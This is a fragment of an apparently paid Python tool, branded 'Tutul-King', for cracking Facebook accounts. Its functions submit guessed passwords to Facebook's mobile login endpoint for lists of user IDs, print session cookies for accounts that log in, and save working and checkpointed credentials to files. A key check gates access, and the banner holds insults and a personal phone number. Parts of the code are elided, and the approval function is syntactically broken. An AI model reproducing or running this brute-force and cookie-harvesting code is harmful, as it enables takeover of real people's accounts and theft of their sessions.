#DEC BYB:- AMINUR RAHMAN
#GITHUB:- AMINUR69 
#FUCK YOU TUTUL 
#TUTUL AR BAP AMINUR ðŸ˜ˆ
#-----------------[ Tutul-King ]-------------------#
...
║╔═╗║║║║║╠╣╠╣║─║║║╚═╝║║║╚╗
╚╝─╚╩╝╚╝╚╩══╩╝─╚═╩═══╩╝╚═╝
â• â•â•[Author                   â€¢ \33[1;38mMD-AMINUR RAHMAN ]\33[1;38m     â•‘\033[1;31m 
â• â•â•[Facebook                 â€¢ MD-AMINUR RAHMAN ]   â•‘  \033[1;97m  
â• â•â•[Github                   â€¢ \33[1;38maminur69 ]   â•‘\33[1;34m   
â• â•â•[Whatsapp                 â€¢ 01878410686 ]  â•‘\33[1;35m 
â• â•â•[TOOLS                    â€¢ PAID ]         â•‘ \33[1;32m   
â• â•â•[VERSION                  â€¢ 9.5 ]          â•‘\033[1;35m 
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Tutulâ€¢M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}â€¢{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Tutul-Cp] {idf} â€¢ {pw}')
                ...
                print(f'\r\033[0;92m[Tutul-OkðŸ’š] {idf} â€¢ {pw}\n\033[0;93m[ðŸŒº]= COOKIES â€¢ \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}â€¢Tutul-Cp] {idf} â€¢ {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' â€¢ '+pw+'\n')
                akun.append(idf+' â€¢ '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}â€¢Tutul-Ok] {idf} â€¢ {pw} ')
...
def approval():
	...
	6 key="6" join(uuid)
	ress-httpx.get("https://raw.githubusercontent.com/Aminur69/Demon.py/main/apruval.py").text
	if key in ress:
		menu()
 	else:
  	   os.system("clear")
         print("THIS TOOL.IS FREE BUT YOU NEED PERMISSION USE IT")
         print("Your key: "+frist+key+last)
         print("======================")
         name = input("YOUR NAME")
         os.system("xdg-open https://wa.me/+8801878410686")
